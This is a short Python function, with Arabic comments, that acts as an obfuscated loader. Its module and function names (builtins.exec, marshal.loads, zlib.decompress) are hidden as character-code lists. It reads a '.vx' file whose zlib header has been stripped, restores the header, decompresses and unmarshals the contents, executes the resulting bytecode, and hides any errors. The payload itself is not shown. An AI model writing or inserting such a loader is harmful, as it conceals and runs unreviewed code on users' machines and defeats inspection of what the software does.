def RUN(name="payload"):
    try:
        (
            lambda b: getattr(
                __import__(''.join(map(chr, [98,117,105,108,116,105,110,115]))),
                ''.join(map(chr, [101,120,101,99]))
            )(
                getattr(
                    __import__(''.join(map(chr, [109,97,114,115,104,97,108]))),
                    ''.join(map(chr, [108,111,97,100,115]))
                )(
                    getattr(
                        __import__(''.join(map(chr, [122,108,105,98]))),
                        ''.join(map(chr, [100,101,99,111,109,112,114,101,115,115]))
                    )(
                        b''.join([
                            b'\x78\x9c',  # تعويض أول 2 بايت
                            open(f"{name}.vx", "rb").read()
                        ])
                    )
                )
            )
        )(None)
    except Exception as e:
        print("⚠️ خطأ في التنفيذ.")